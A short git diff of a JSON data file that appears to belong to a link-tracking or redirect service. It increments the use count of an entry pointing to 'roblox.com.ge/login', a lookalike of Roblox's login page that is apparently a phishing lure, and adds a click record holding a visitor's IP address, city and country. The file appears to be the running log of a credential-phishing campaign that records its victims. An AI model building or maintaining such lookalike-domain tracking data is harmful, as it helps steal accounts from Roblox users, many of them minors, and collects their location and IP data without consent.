@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1531,
+    "useCount": 1532,
     "createdBy": "admin",
     "clicks": [
       {
@@ -12414,6 +12414,14 @@
         "ip": "223.25.59.193",
         "country": "Philippines",
         "city": "Olongapo City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
+      },
+      {
+        "timestamp": 1777448386200,
+        "ip": "131.226.104.217",
+        "country": "Philippines",
+        "city": "Manila",
         "flag": "🇵🇭",
         "countryCode": "PH"
       }
